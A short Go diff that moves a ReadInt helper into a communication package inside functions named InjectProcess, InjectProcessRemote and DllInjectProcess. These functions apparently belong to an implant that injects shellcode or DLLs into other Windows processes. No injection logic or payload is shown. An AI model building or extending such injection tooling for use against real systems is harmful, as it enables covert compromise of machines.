@@ -9,13 +9,14 @@ import (
 	"fmt"
 	"github.com/Binject/debug/pe"
 	"golang.org/x/sys/windows"
+	"main/communication"
 	"os"
 	"strings"
 	"unsafe"
 )
 
 func InjectProcess(b []byte) ([]byte, error) {
-	pid := ReadInt(b)
+	pid := communication.ReadInt(b)
 	sh := b[8:]
 
 	if os.Getpid() == int(pid) {
@@ -102,7 +103,7 @@ func InjectProcess(b []byte) ([]byte, error) {
 }
 
 func InjectProcessRemote(b []byte) ([]byte, error) {
-	pid := ReadInt(b)
+	pid := communication.ReadInt(b)
 	sh := b[8:]
 
 	if os.Getpid() == int(pid) {
@@ -143,7 +144,7 @@ func InjectProcessRemote(b []byte) ([]byte, error) {
 }
 
 func DllInjectProcess(params []byte, b []byte) ([]byte, error) {
-	pid := ReadInt(b)
+	pid := communication.ReadInt(b)
 	b = b[8:]
 
 	if os.Getpid() == int(pid) {
